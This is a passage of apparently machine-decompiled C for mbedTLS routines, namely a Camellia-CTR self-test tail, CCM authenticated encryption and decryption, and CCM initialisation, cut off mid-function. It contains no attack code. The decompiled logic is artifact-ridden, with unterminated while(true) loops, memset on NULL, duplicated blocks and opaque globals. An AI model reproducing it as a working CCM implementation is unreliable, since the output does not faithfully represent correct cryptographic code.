            int32_t v57 = v56 / 2; // 0x806fd14
            int32_t v58 = v56 % 2; // 0x806fd14
            g7 = v57;
            g3 = v58;
            if (v53 != 0) {
                int32_t v59 = (int32_t)"enc"; // 0x806fd2c
                if (v58 == 0) {
                    // if_806fd29_0_true
                    v59 = (int32_t)"dec";
                    // branch -> after_if_806fd29_0
                }
                // after_if_806fd29_0
                printf("  CAMELLIA-CTR-128 (%s): ", (char *)v59);
                v57 = g7;
                // branch -> 0x806fd3c
            }
            int32_t v60 = 16 * v57; // 0x806fd3e
            v51 = *(int32_t *)(v60 + (int32_t)&g163);
            v10 = *(int32_t *)(v60 + (int32_t)&g164);
            int32_t v61 = 0;
            mbedtls_camellia_setkey_enc(&v11, v9, 128, (int32_t)v55, v33, v7, v21, 0);
            int32_t v62 = g3; // 0x806fdb3
            int32_t v63 = g7; // 0x806fc70
            int32_t v64 = *(int32_t *)(4 * v63 + (int32_t)&g165); // 0x806fc70
            g3 = v64;
            int32_t v65 = 48 * v63; // 0x806fc7a
            if (v62 == 0) {
                // 0x806fc70
                g5 = v65 + (int32_t)"Single block msg";
                memcpy((char *)&str, (char *)(v65 + (int32_t)&g166), v64);
                mbedtls_camellia_crypt_ctr(v8, g3, &v61, v52, v50, v7, v7);
                // branch -> 0x806fcd4
            } else {
                // 0x806fdbb
                g5 = v65 + (int32_t)&g166;
                memcpy((char *)&str, (char *)(v65 + (int32_t)"Single block msg"), v64);
                mbedtls_camellia_crypt_ctr(v8, g3, &v61, v52, v50, v7, v7);
                // branch -> 0x806fcd4
            }
            uint32_t strncmp_rc3 = strncmp((char *)&str, (char *)g5, g3);
            g237 = strncmp_rc3 % 2 == 0;
            if (strncmp_rc3 % 2 == 0) {
                // 0x806fce6
                if (a1 != 0) {
                    // 0x806fe83
                    puts("passed");
                    // branch -> 0x806fcf1
                }
                int32_t v66 = v56 + 1; // 0x806fcf1
                if (v66 == 6) {
                    // 0x806fe94
                    g1 = 0;
                    if (a1 != 0) {
                        // 0x806fea0
                        putchar(10);
                        g1 = 0;
                        // branch -> 0x806f9a0
                    }
                    // 0x806f9a0
                    g3 = v5;
                    g7 = v4;
                    g5 = v3;
                    return 0;
                }
                // 0x806fcf1
                v53 = a1;
                v54 = (char *)v66;
                v21 = v7;
                v33 = v50;
                v55 = (char *)&v51;
                // branch -> 0x806fd05
                continue;
            } else {
                // 0x806f990
                g1 = 1;
                if (a1 != 0) {
                    // 0x806fc10
                    puts("failed");
                    g1 = 1;
                    g3 = v5;
                    g7 = v4;
                    g5 = v3;
                    return 1;
                }
            }
            // 0x806f9a0
            g3 = v5;
            g7 = v4;
            g5 = v3;
            return 1;
        }
    }
    // 0x806f781
    v7 = &str;
    v9 = &v10;
    v8 = &v11;
    v13 = (char *)v12;
    // branch -> 0x806f7a0
    for (uint32_t i = 0; i < 6; i++) {
        // 0x806f7a0
        v17 = i % 2;
        v15 = i / 2;
        v18 = v15 + 2;
        if (a1 == 0) {
            v14 = v15;
            v16 = v18;
            goto lab_0x806f7f2;
        }
        goto lab_0x806f7c1;
    }
}

// Address range: 0x806fed0 - 0x806feef
int32_t mbedtls_ccm_init(char * a1) {
    // 0x806fed0
    memset(a1, 0, 16);
    return 0;
}

// Address range: 0x806fef0 - 0x807038f
int32_t ccm_auth_crypt(char * a1, char * a2, int32_t a3, uint32_t a4, int32_t a5, int32_t a6, int32_t a7, char a8) {
    int32_t v1;
    int32_t v2 = &v1; // ebp
    int32_t v3 = a8;
    int32_t v4 = g7; // 0x806feff
    int32_t v5 = g4; // 0x806ff02
    g7 = v5;
    int32_t v6 = g3; // 0x806ff04
    int32_t v7 = g5; // 0x806ff07
    if (v3 < 17) {
        // 0x806ff28
        if (a8 == 1) {
            uint32_t v8 = (int32_t)a2;
            if (v8 > 13) {
                // 0x806ff12
                // branch -> 0x806ff17
                // 0x806ff17
                g7 = v4;
                g3 = v6;
                g5 = v7;
                g2 = v1;
                return -13;
            }
            // 0x806ff39
            if (a4 <= 0xff00) {
                // 0x806ff42
                int32_t v9;
                int32_t v10 = &v9; // 0x806ff46_0
                int32_t v11 = 15 - v8 % 256; // 0x806ff4d
                int32_t v12 = a4 == 0 ? 0 : 0x40000000; // 0x806ff6e
                v9 = (0x1000000 * v11 - 0x1000000 | v12 | 0x8000000 * (v3 + 62) / 2) / 0x1000000;
                int32_t v13;
                memcpy((char *)&v13, a1, v8);
                *(char *)(v10 + 15) = (char)v5;
                int32_t v14 = v10 - 1; // 0x806ffa6
                uint32_t v15 = v5; // 0x806ffa9
                int32_t v16 = v15 / 256; // 0x806ffa9
                // branch -> 0x806ff9f
                while ((char)v11 > (char)(0x1000000 * v10 / 0x1000000 - v14)) {
                    // 0x806ff9f
                    *(char *)(v14 + 15) = (char)v16;
                    v14--;
                    v15 = v16;
                    v16 = v15 / 256;
                    // continue -> 0x806ff9f
                }
                // 0x806ffb3
                if (v15 < 256) {
                    // 0x806ffbb
                    int32_t v17;
                    g5 = &v17;
                    int32_t v18 = 0; // eax
                    int32_t v19 = 4;
                    int32_t v20 = 0;
                    // branch -> 0x806ffca
                    while (true) {
                        // 0x806ffca
                        memset((char *)&v17, v20, v19);
                        int32_t v21 = v18; // 0x806ffca
                        unsigned char v22 = *(char *)(v2 - 44 + v21); // 0x806ffca
                        char * v23 = (char *)(v2 - 60 + v21); // 0x806ffcf_0
                        *v23 = *v23 ^ v22;
                        int32_t v24 = v18 + 1; // 0x806ffd3
                        v18 = v24;
                        if (v24 == 16) {
                            int32_t v25 = v2 - 60; // 0x806ffde
                            g3 = v25;
                            *(int32_t *)(v2 - 120) = g6;
                            int32_t * v26 = (int32_t *)a5;
                            int32_t result = mbedtls_cipher_update((char *)v25, (char *)16, v25, v2 - 28, v26, a6, a7, v3); // 0x806fffe
                            int32_t v27 = g2; // 0x8070003
                            int32_t v28 = *(int32_t *)(v27 - 120); // edx
                            if (result != 0) {
                                // 0x806ff17
                                g7 = v4;
                                g3 = v6;
                                g5 = v7;
                                g2 = v1;
                                return result;
                            }
                            int32_t v29 = v27; // 0x8070136
                            int32_t v30 = v25; // bp+687
                            int32_t v31; // 0x807035e
                            int32_t v32; // 0x686102
                            char * v33; // 0x807035a_0
                            int32_t result2; // 0x8070344
                            char * v34;
                            char * v35;
                            int32_t v36; // 0x8070355
                            int32_t v37; // 0x8070143
                            int32_t v38; // 0x8070181
                            int32_t v39; // 0x807019995
                            int32_t v40; // 0x80701b4
                            int32_t v41;
                            int32_t v42; // 0x807031c
                            int32_t v43; // 0x8070366
                            int32_t v44; // 0x8070309
                            char v45; // 0x807030c
                            int32_t v46; // 0x8070327
                            int32_t v47; // 0x807032a
                            int32_t v48; // 0x807035a
                            unsigned char v49; // 0x807031c
                            int32_t v50; // 0x807019998
                            int32_t v51; // 0x8070317
                            char v52; // 0x8070355
                            if (*(int32_t *)(v27 + 20) == 0) {
                                // 0x8070136
                                *(int32_t *)(v29 - 132) = v29 - 76;
                                v37 = g2;
                                *(int32_t *)(v37 - 120) = v28;
                                *(char *)(g2 - 76) = *(char *)(v29 - 110);
                                v34 = (char *)*(int32_t *)(v37 + 8);
                                memcpy(v34, (char *)*(int32_t *)(g2 + 12), v30);
                                memset(NULL, (int32_t)*(char *)(g2 - 109), v30);
                                v38 = g2;
                                *(char *)(v38 - 61) = 1;
                                *(int32_t *)(g2 - 104) = *(int32_t *)(v38 + 28);
                                *(int32_t *)(g2 - 96) = *(int32_t *)(v38 + 24);
                                *(int32_t *)(g2 - 92) = g7;
                                g3 = *(int32_t *)(v38 - 120);
                                v39 = g2;
                                v50 = *(int32_t *)(v39 - 92);
                                if (v50 == 0) {
                                    v41 = v39;
                                    // 0x8070309
                                    v44 = v41 - 76;
                                    v45 = *(char *)(v41 - 132);
                                    *(char *)(v44 + 15) = 0;
                                    v51 = v44 - 1;
                                    v42 = g2;
                                    v49 = *(char *)(v42 - 109);
                                    // branch -> 0x807030c
                                    while (v49 > (char)((int32_t)v45 - v51)) {
                                        // 0x807030c
                                        v45 = *(char *)(v42 - 132);
                                        *(char *)(v51 + 15) = 0;
                                        v51--;
                                        v42 = g2;
                                        v49 = *(char *)(v42 - 109);
                                        // continue -> 0x807030c
                                    }
                                    // 0x8070321
                                    g5 = *(int32_t *)(v42 - 100);
                                    v46 = v42 - 44;
                                    v47 = v42 - 76;
                                    g3 = v47;
                                    result2 = mbedtls_cipher_update((char *)v47, (char *)16, v46, v42 - 28, v26, a6, a7, v3);
                                    if (result2 == 0) {
                                        // 0x8070353
                                        v48 = 0;
                                        v36 = g2;
                                        v52 = *(char *)(v48 - 44 + v36);
                                        v33 = (char *)(v48 - 60 + v36);
                                        *v33 = *v33 ^ v52;
                                        v31 = 1;
                                        // branch -> 0x8070355
                                        while (v31 != 16) {
                                            // 0x8070355
                                            v48 = v31;
                                            v36 = g2;
                                            v52 = *(char *)(v48 - 44 + v36);
                                            v33 = (char *)(v48 - 60 + v36);
                                            *v33 = *v33 ^ v52;
                                            v31++;
                                            // continue -> 0x8070355
                                        }
                                        // 0x8070366
                                        v43 = g2;
                                        v35 = (char *)(v43 - 60);
                                        memcpy(v35, (char *)*(int32_t *)(v43 + 36), v46);
                                        // branch -> 0x806ff17
                                        // 0x806ff17
                                        g7 = v4;
                                        g3 = v6;
                                        g5 = v7;
                                        g2 = v1;
                                        return result2;
                                    }
                                } else {
                                    v40 = v39;
                                    v32 = v30;
                                    while (true) {
                                        // 0x80701a3
                                        g7 = 16;
                                        if (v50 < 17) {
                                            goto lab_if_80701ac_1_true_2;
                                        }
                                        goto lab_after_if_80701ac_1_2;
                                    }
                                }
                                // 0x806ff17
                                g7 = v4;
                                g3 = v6;
                                g5 = v7;
                                g2 = v1;
                                return result2;
                            }
                            // 0x807001a
                            memset((char *)*(int32_t *)(v27 - 124), 0, 4);
                            g5 = 14;
                            *(int32_t *)(g2 - 120) = v28;
                            int32_t v53 = g2; // 0x807002c
                            *(char *)(v53 - 44) = (char)(*(int32_t *)(v53 + 20) / 256);
                            int32_t v54 = g2; // 0x8070038
                            int32_t v55 = v54 + 20; // 0x8070038
                            uint32_t v56 = *(int32_t *)v55; // 0x807003c
                            if (v56 < 15) {
                                // if_8070040_1_true
                                g5 = v56;
                                // branch -> after_if_8070040_1
                            }
                            // after_if_8070040_1
                            *(char *)(v54 - 43) = *(char *)v55;
                            memcpy((char *)*(int32_t *)(v53 + 16), (char *)g5, v25);
                            int32_t v57 = g2; // 0x807005a
                            int32_t v58 = 0; // 0x8070064
                            int32_t v59 = v57; // 0x8070064
                            char v60 = *(char *)(v58 - 44 + v59); // 0x807005f
                            char * v61 = (char *)(v58 - 60 + v59); // 0x8070064_0
                            *v61 = *v61 ^ v60;
                            int32_t v62 = 1; // 0x8070068
                            int32_t v63 = g2; // 0x8070070
                            // branch -> 0x807005f
                            while (v62 != 16) {
                                // 0x807005f
                                v58 = v62;
                                v59 = v63;
                                v60 = *(char *)(v58 - 44 + v59);
                                v61 = (char *)(v58 - 60 + v59);
                                *v61 = *v61 ^ v60;
                                v62++;
                                v63 = g2;
                                // continue -> 0x807005f
                            }
                            // 0x8070070
                            g3 = *(int32_t *)(v63 - 100);
                            *(int32_t *)(v63 - 120) = *(int32_t *)(v57 - 120);
                            int32_t v64 = v63 - 60; // 0x8070080
                            int32_t result3 = mbedtls_cipher_update((char *)v64, (char *)16, v64, v63 - 28, v26, a6, a7, v3); // 0x8070093
                            int32_t v65 = g2; // 0x8070098
                            if (result3 != 0) {
                                // 0x806ff17
                                g7 = v4;
                                g3 = v6;
                                g5 = v7;
                                g2 = v1;
                                return result3;
                            }
                            // 0x80700a5
                            *(int32_t *)(v65 - 116) = *(int32_t *)(v65 - 120);
                            int32_t v66 = g5; // 0x80700ab
                            int32_t v67 = g2; // 0x80700ad
                            *(int32_t *)(v67 - 92) = *(int32_t *)(v65 + 20) - v66;
                            *(int32_t *)(g2 - 108) = *(int32_t *)(v67 + 16) + v66;
                            int32_t v68 = g2; // 0x80700b6104
                            int32_t v69 = v68;
                            if (*(int32_t *)(v68 - 92) == 0) {
                                // 0x8070133
                                v29 = v69;
                                v30 = v64;
                                // branch -> 0x8070136
                                // 0x8070136
                                *(int32_t *)(v29 - 132) = v29 - 76;
                                v37 = g2;
                                *(int32_t *)(v37 - 120) = *(int32_t *)(v69 - 116);
                                *(char *)(g2 - 76) = *(char *)(v29 - 110);
                                v34 = (char *)*(int32_t *)(v37 + 8);
                                memcpy(v34, (char *)*(int32_t *)(g2 + 12), v30);
                                memset(NULL, (int32_t)*(char *)(g2 - 109), v30);
                                v38 = g2;
                                *(char *)(v38 - 61) = 1;
                                *(int32_t *)(g2 - 104) = *(int32_t *)(v38 + 28);
                                *(int32_t *)(g2 - 96) = *(int32_t *)(v38 + 24);
                                *(int32_t *)(g2 - 92) = g7;
                                g3 = *(int32_t *)(v38 - 120);
                                v39 = g2;
                                v50 = *(int32_t *)(v39 - 92);
                                if (v50 == 0) {
                                    v41 = v39;
                                    // 0x8070309
                                    v44 = v41 - 76;
                                    v45 = *(char *)(v41 - 132);
                                    *(char *)(v44 + 15) = 0;
                                    v51 = v44 - 1;
                                    v42 = g2;
                                    v49 = *(char *)(v42 - 109);
                                    // branch -> 0x807030c
                                    while (v49 > (char)((int32_t)v45 - v51)) {
                                        // 0x807030c
                                        v45 = *(char *)(v42 - 132);
                                        *(char *)(v51 + 15) = 0;
                                        v51--;
                                        v42 = g2;
                                        v49 = *(char *)(v42 - 109);
                                        // continue -> 0x807030c
                                    }
                                    // 0x8070321
                                    g5 = *(int32_t *)(v42 - 100);
                                    v46 = v42 - 44;
                                    v47 = v42 - 76;
                                    g3 = v47;
                                    result2 = mbedtls_cipher_update((char *)v47, (char *)16, v46, v42 - 28, v26, a6, a7, v3);
                                    if (result2 == 0) {
                                        // 0x8070353
                                        v48 = 0;
                                        v36 = g2;
                                        v52 = *(char *)(v48 - 44 + v36);
                                        v33 = (char *)(v48 - 60 + v36);
                                        *v33 = *v33 ^ v52;
                                        v31 = 1;
                                        // branch -> 0x8070355
                                        while (v31 != 16) {
                                            // 0x8070355
                                            v48 = v31;
                                            v36 = g2;
                                            v52 = *(char *)(v48 - 44 + v36);
                                            v33 = (char *)(v48 - 60 + v36);
                                            *v33 = *v33 ^ v52;
                                            v31++;
                                            // continue -> 0x8070355
                                        }
                                        // 0x8070366
                                        v43 = g2;
                                        v35 = (char *)(v43 - 60);
                                        memcpy(v35, (char *)*(int32_t *)(v43 + 36), v46);
                                        // branch -> 0x806ff17
                                        // 0x806ff17
                                        g7 = v4;
                                        g3 = v6;
                                        g5 = v7;
                                        g2 = v1;
                                        return result2;
                                    }
                                } else {
                                    v40 = v39;
                                    v32 = v30;
                                    while (true) {
                                        // 0x80701a3
                                        g7 = 16;
                                        if (v50 < 17) {
                                            goto lab_if_80701ac_1_true_2;
                                        }
                                        goto lab_after_if_80701ac_1_2;
                                    }
                                }
                                // 0x806ff17
                                g7 = v4;
                                g3 = v6;
                                g5 = v7;
                                g2 = v1;
                                return result2;
                            }
                            int32_t v70; // 0x8070108
                            while (true) {
                                // 0x80700bc
                                g3 = 16;
                                uint32_t v71 = *(int32_t *)(v68 - 92); // 0x80700c9
                                if (v71 < 17) {
                                    // if_80700cd_1_true
                                    g3 = v71;
                                    // branch -> after_if_80700cd_1
                                }
                                // after_if_80700cd_1
                                memset((char *)*(int32_t *)(v68 - 124), 0, 4);
                                g5 = g2 - 44;
                                memcpy((char *)*(int32_t *)(g2 - 108), (char *)g3, v64);
                                int32_t v72 = 0; // 0x80700f2
                                int32_t v73 = g2; // 0x80700ed
                                char v74 = *(char *)(v72 - 44 + v73); // 0x80700ed
                                char * v75 = (char *)(v72 - 60 + v73); // 0x80700f2_0
                                *v75 = *v75 ^ v74;
                                // branch -> 0x80700ed
                                while (true) {
                                    // 0x80700ed
                                    v72 = 1;
                                    v73 = g2;
                                    v74 = *(char *)(v72 - 44 + v73);
                                    v75 = (char *)(v72 - 60 + v73);
                                    *v75 = *v75 ^ v74;
                                    // continue -> 0x80700ed
                                }
                                int32_t v76 = g2; // 0x80700fe
                                v70 = v76 - 60;
                                int32_t result4 = mbedtls_cipher_update((char *)v70, (char *)16, v70, v76 - 28, v26, a6, a7, v3); // 0x807011e
                                if (result4 != 0) {
                                    // 0x8070302
                                    // branch -> 0x806ff17
                                    // 0x806ff17
                                    g7 = v4;
                                    g3 = v6;
                                    g5 = v7;
                                    g2 = v1;
                                    return result4;
                                }
                                int32_t * v77 = (int32_t *)(g2 - 92); // 0x807012b_0
                                *v77 = *v77 - g3;
                                int32_t * v78 = (int32_t *)(g2 - 108); // 0x807012e_0
                                *v78 = g3 + *v78;
                                int32_t v79 = g2; // 0x80700b6
                                if (*(int32_t *)(v79 - 92) == 0) {
                                    v69 = v79;
                                    // break -> 0x8070133
                                    break;
                                }
                                v68 = v79;
                                int32_t v80 = v70; // 0x688111
                                // continue -> 0x80700bc
                            }
                            // 0x8070133
                            v29 = v69;
                            v30 = v70;
                            // branch -> 0x8070136
                            // 0x8070136
                            *(int32_t *)(v29 - 132) = v29 - 76;
                            v37 = g2;
                            *(int32_t *)(v37 - 120) = *(int32_t *)(v69 - 116);
                            *(char *)(g2 - 76) = *(char *)(v29 - 110);
                            v34 = (char *)*(int32_t *)(v37 + 8);
                            memcpy(v34, (char *)*(int32_t *)(g2 + 12), v30);
                            memset(NULL, (int32_t)*(char *)(g2 - 109), v30);
                            v38 = g2;
                            *(char *)(v38 - 61) = 1;
                            *(int32_t *)(g2 - 104) = *(int32_t *)(v38 + 28);
                            *(int32_t *)(g2 - 96) = *(int32_t *)(v38 + 24);
                            *(int32_t *)(g2 - 92) = g7;
                            g3 = *(int32_t *)(v38 - 120);
                            v39 = g2;
                            v50 = *(int32_t *)(v39 - 92);
                            if (v50 == 0) {
                                v41 = v39;
                                // 0x8070309
                                v44 = v41 - 76;
                                v18 = v44;
                                int32_t v81 = v44; // 0x8070313
                                int32_t v82 = v41; // 0x807030c
                                v45 = *(char *)(v82 - 132);
                                *(char *)(v81 + 15) = 0;
                                v51 = v18 - 1;
                                v18 = v51;
                                v42 = g2;
                                v49 = *(char *)(v42 - 109);
                                // branch -> 0x807030c
                                while (v49 > (char)((int32_t)v45 - v51)) {
                                    // 0x807030c
                                    v81 = v51;
                                    v82 = v42;
                                    v45 = *(char *)(v82 - 132);
                                    *(char *)(v81 + 15) = 0;
                                    v51 = v18 - 1;
                                    v18 = v51;
                                    v42 = g2;
                                    v49 = *(char *)(v42 - 109);
                                    // continue -> 0x807030c
                                }
                                // 0x8070321
                                g5 = *(int32_t *)(v42 - 100);
                                v46 = v42 - 44;
                                v47 = v42 - 76;
                                g3 = v47;
                                result2 = mbedtls_cipher_update((char *)v47, (char *)16, v46, v42 - 28, v26, a6, a7, v3);
                                if (result2 == 0) {
                                    // 0x8070353
                                    v18 = 0;
                                    v48 = 0;
                                    v36 = g2;
                                    v52 = *(char *)(v48 - 44 + v36);
                                    v33 = (char *)(v48 - 60 + v36);
                                    *v33 = *v33 ^ v52;
                                    v31 = v18 + 1;
                                    v18 = v31;
                                    // branch -> 0x8070355
                                    while (v31 != 16) {
                                        // 0x8070355
                                        v48 = v31;
                                        v36 = g2;
                                        v52 = *(char *)(v48 - 44 + v36);
                                        v33 = (char *)(v48 - 60 + v36);
                                        *v33 = *v33 ^ v52;
                                        v31 = v18 + 1;
                                        v18 = v31;
                                        // continue -> 0x8070355
                                    }
                                    // 0x8070366
                                    v43 = g2;
                                    v35 = (char *)(v43 - 60);
                                    memcpy(v35, (char *)*(int32_t *)(v43 + 36), v46);
                                    // branch -> 0x806ff17
                                    // 0x806ff17
                                    g7 = v4;
                                    g3 = v6;
                                    g5 = v7;
                                    g2 = v1;
                                    return result2;
                                }
                            } else {
                                int32_t v83 = v50; // 0x80701a3
                                v40 = v39;
                                v32 = v30;
                                while (true) {
                                    // 0x80701a3
                                    g7 = 16;
                                    int32_t v84; // 0x8070199
                                    if (v84 < 17) {
                                      lab_if_80701ac_1_true_2:
                                        // if_80701ac_1_true
                                        g7 = *(int32_t *)(v40 - 92);
                                        // branch -> after_if_80701ac_1
                                    }
                                  lab_after_if_80701ac_1_2:;
                                    // after_if_80701ac_1
                                    int32_t result5; // 0x8070239
                                    char * v85;
                                    int32_t v86; // 0x8070220
                                    int32_t v87; // 0x8070223
                                    if (g3 != 0) {
                                        v86 = v40;
                                        // 0x8070216
                                        v87 = v86 - 44;
                                        g5 = v87;
                                        v85 = (char *)(v86 - 76);
                                        result5 = mbedtls_cipher_update(v85, (char *)16, v87, v86 - 28, v26, a6, a7, v3);
                                        if (result5 == 0) {
                                            goto lab_0x8070246;
                                        }
                                        // 0x8070302
                                        // branch -> 0x806ff17
                                        // 0x806ff17
                                        g7 = v4;
                                        g3 = v6;
                                        g5 = v7;
                                        g2 = v1;
                                        return result5;
                                    }
                                    // 0x80701b4
                                    memset((char *)*(int32_t *)(v40 - 124), 0, 4);
                                    g5 = g2 - 44;
                                    memcpy((char *)*(int32_t *)(g2 - 96), (char *)g7, v32);
                                    int32_t v88 = 0; // 0x80701dd
                                    int32_t v89 = g2; // 0x80701d8
                                    char v90 = *(char *)(v88 - 44 + v89); // 0x80701d8
                                    char * v91 = (char *)(v88 - 60 + v89); // 0x80701dd_0
                                    *v91 = *v91 ^ v90;
                                    // branch -> 0x80701d8
                                    while (true) {
                                        // 0x80701d8
                                        v88 = 1;
                                        v89 = g2;
                                        v90 = *(char *)(v88 - 44 + v89);
                                        v91 = (char *)(v88 - 60 + v89);
                                        *v91 = *v91 ^ v90;
                                        // continue -> 0x80701d8
                                    }
                                    int32_t v92 = g2; // 0x80701e9
                                    int32_t v93 = v92 - 60; // 0x80701f3
                                    int32_t v94 = mbedtls_cipher_update((char *)v93, (char *)16, v93, v92 - 28, v26, a6, a7, v3); // 0x8070209
                                    int32_t result7; // 0x8070302
                                    if (v94 == 0) {
                                        // 0x80701e9
                                        v86 = g2;
                                        // branch -> 0x8070216
                                        // 0x8070216
                                        v87 = v86 - 44;
                                        g5 = v87;
                                        v85 = (char *)(v86 - 76);
                                        result5 = mbedtls_cipher_update(v85, (char *)16, v87, v86 - 28, v26, a6, a7, v3);
                                        if (result5 == 0) {
                                          lab_0x8070246:;
                                            // 0x8070246
                                            int32_t v95; // 0x8070261
                                            if (g7 != 0) {
                                                int32_t v96 = 0; // 0x807025e227
                                                int32_t v97 = g2; // 0x807024a
                                                char v98 = *(char *)(*(int32_t *)(v97 - 96) + v96); // 0x8070250
                                                int32_t v99 = *(int32_t *)(v97 - 104); // 0x8070254
                                                char v100 = *(char *)(v96 - 44 + v97); // 0x8070257
                                                *(char *)(v99 + v96) = v100 ^ v98;
                                                int32_t v101 = 1;
                                                uint32_t v102 = v101 % 256; // 0x807025e
                                                v95 = g7;
                                                while (v95 > v102) {
                                                    // 0x807024a
                                                    v96 = v102;
                                                    v97 = g2;
                                                    v98 = *(char *)(*(int32_t *)(v97 - 96) + v96);
                                                    v99 = *(int32_t *)(v97 - 104);
                                                    v100 = *(char *)(v96 - 44 + v97);
                                                    *(char *)(v99 + v96) = v100 ^ v98;
                                                    v101++;
                                                    v102 = v101 % 256;
                                                    v95 = g7;
                                                    // continue -> 0x807024a
                                                }
                                                int32_t * v103; // 0x807026a_0
                                                int32_t * v104; // 0x807026d_0
                                                int32_t * v105; // 0x8070270_0
                                                char * v106; // 0x807028d_0
                                                int32_t v107; // 0x8070199
                                                if (g3 == 1) {
                                                  lab_0x80702a0:
                                                    // 0x80702a0
                                                    memset((char *)*(int32_t *)(g2 - 124), 0, 4);
                                                    memcpy((char *)*(int32_t *)(g2 - 104), (char *)g7, v87);
                                                    int32_t v108 = 0; // 0x80702c9
                                                    int32_t v109 = g2; // 0x80702c4
                                                    char v110 = *(char *)(v108 - 44 + v109); // 0x80702c4
                                                    char * v111 = (char *)(v108 - 60 + v109); // 0x80702c9_0
                                                    *v111 = *v111 ^ v110;
                                                    // branch -> 0x80702c4
                                                    while (true) {
                                                        // 0x80702c4
                                                        v108 = 1;
                                                        v109 = g2;
                                                        v110 = *(char *)(v108 - 44 + v109);
                                                        v111 = (char *)(v108 - 60 + v109);
                                                        *v111 = *v111 ^ v110;
                                                        // continue -> 0x80702c4
                                                    }
                                                    int32_t v112 = g2; // 0x80702d5
                                                    g5 = *(int32_t *)(v112 - 100);
                                                    int32_t v113 = v112 - 60; // 0x80702df
                                                    int32_t result6 = mbedtls_cipher_update((char *)v113, (char *)16, v113, v112 - 28, v26, a6, a7, v3); // 0x80702f5
                                                    if (result6 != 0) {
                                                        // 0x8070302
                                                        // branch -> 0x806ff17
                                                        // 0x806ff17
                                                        g7 = v4;
                                                        g3 = v6;
                                                        g5 = v7;
                                                        g2 = v1;
                                                        return result6;
                                                    }
                                                    // 0x80702d5
                                                    // branch -> 0x807026a
                                                    // 0x807026a
                                                    v103 = (int32_t *)(g2 - 104);
                                                    *v103 = *v103 + g7;
                                                    v104 = (int32_t *)(g2 - 96);
                                                    *v104 = g7 + *v104;
                                                    v105 = (int32_t *)(g2 - 92);
                                                    *v105 = *v105 - g7;
                                                    v106 = (char *)(g2 - 61);
                                                    *v106 = (char)((int32_t)*v106 + 1);
                                                    v107 = g2;
                                                    v84 = *(int32_t *)(v107 - 92);
                                                    if (v84 == 0) {
                                                        v41 = v107;
                                                        // break -> 0x8070309
                                                        break;
                                                    }
                                                    v83 = v84;
                                                    v40 = v107;
                                                    v32 = v113;
                                                    // continue -> 0x80701a3
                                                    continue;
                                                }
                                              lab_0x807026a:
                                                // 0x807026a
                                                v103 = (int32_t *)(g2 - 104);
                                                *v103 = *v103 + v95;
                                                v104 = (int32_t *)(g2 - 96);
                                                *v104 = g7 + *v104;
                                                v105 = (int32_t *)(g2 - 92);
                                                *v105 = *v105 - g7;
                                                v106 = (char *)(g2 - 61);
                                                *v106 = (char)((int32_t)*v106 + 1);
                                                v107 = g2;
                                                v84 = *(int32_t *)(v107 - 92);
                                                if (v84 == 0) {
                                                    v41 = v107;
                                                    // break -> 0x8070309
                                                    break;
                                                }
                                                v40 = v107;
                                                v32 = v87;
                                                // continue -> 0x80701a3
                                                continue;
                                            }
                                            // 0x8070265
                                            if (g3 == 1) {
                                                goto lab_0x80702a0;
                                            }
                                            v95 = 0;
                                            goto lab_0x807026a;
                                        } else {
                                            result7 = result5;
                                        }
                                    } else {
                                        result7 = v94;
                                    }
                                    // 0x8070302
                                    // branch -> 0x806ff17
                                    // 0x806ff17
                                    g7 = v4;
                                    g3 = v6;
                                    g5 = v7;
                                    g2 = v1;
                                    return result7;
                                }
                                // 0x8070309
                                v44 = v41 - 76;
                                v45 = *(char *)(v41 - 132);
                                *(char *)(v44 + 15) = 0;
                                v51 = v44 - 1;
                                v42 = g2;
                                v49 = *(char *)(v42 - 109);
                                // branch -> 0x807030c
                                while (v49 > (char)((int32_t)v45 - v51)) {
                                    // 0x807030c
                                    v45 = *(char *)(v42 - 132);
                                    *(char *)(v51 + 15) = 0;
                                    v51--;
                                    v42 = g2;
                                    v49 = *(char *)(v42 - 109);
                                    // continue -> 0x807030c
                                }
                                // 0x8070321
                                g5 = *(int32_t *)(v42 - 100);
                                v46 = v42 - 44;
                                v47 = v42 - 76;
                                g3 = v47;
                                result2 = mbedtls_cipher_update((char *)v47, (char *)16, v46, v42 - 28, v26, a6, a7, v3);
                                if (result2 == 0) {
                                    // 0x8070353
                                    v48 = 0;
                                    v36 = g2;
                                    v52 = *(char *)(v48 - 44 + v36);
                                    v33 = (char *)(v48 - 60 + v36);
                                    *v33 = *v33 ^ v52;
                                    v31 = 1;
                                    // branch -> 0x8070355
                                    while (v31 != 16) {
                                        // 0x8070355
                                        v48 = v31;
                                        v36 = g2;
                                        v52 = *(char *)(v48 - 44 + v36);
                                        v33 = (char *)(v48 - 60 + v36);
                                        *v33 = *v33 ^ v52;
                                        v31++;
                                        // continue -> 0x8070355
                                    }
                                    // 0x8070366
                                    v43 = g2;
                                    v35 = (char *)(v43 - 60);
                                    memcpy(v35, (char *)*(int32_t *)(v43 + 36), v46);
                                    // branch -> 0x806ff17
                                    // 0x806ff17
                                    g7 = v4;
                                    g3 = v6;
                                    g5 = v7;
                                    g2 = v1;
                                    return result2;
                                }
                            }
                            // 0x806ff17
                            g7 = v4;
                            g3 = v6;
                            g5 = v7;
                            g2 = v1;
                            return result2;
                        }
                        // 0x806ffca
                        v19 = v22;
                        v20 = v24;
                        // branch -> 0x806ffca
                    }
                }
            }
            // 0x806ff12
            // branch -> 0x806ff17
            // 0x806ff17
            g7 = v4;
            g3 = v6;
            g5 = v7;
            g2 = v1;
            return -13;
        }
    }
    // 0x806ff12
    // branch -> 0x806ff17
    // 0x806ff17
    g7 = v4;
    g3 = v6;
    g5 = v7;
    g2 = v1;
    return -13;
}

// Address range: 0x8070390 - 0x807044f
int32_t mbedtls_ccm_auth_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, char * a8, int32_t a9, int32_t a10) {
    g6 = 1;
    int32_t v1 = g7; // 0x8070399
    int32_t v2 = g3; // 0x807039a
    g3 = a10;
    g4 = a2;
    int32_t v3 = (int32_t)a8;
    g7 = a9;
    int32_t v4;
    int32_t result = ccm_auth_crypt((char *)a3, (char *)a4, a5, a6, a7, v3, (int32_t)&v4, (char)a10); // 0x80703de
    if (result != 0) {
        // 0x8070416
        g3 = v2;
        g7 = v1;
        return result;
    }
    // 0x80703ea
    if (g3 == 0) {
        // 0x8070416
        g3 = v2;
        g7 = v1;
        return 0;
    }
    int32_t v5 = 0; // 0x80703f8
    int32_t v6 = v5 + 1; // 0x80703fb
    char v7 = *(char *)(g2 - 40 + v5 % 256); // 0x80703fe
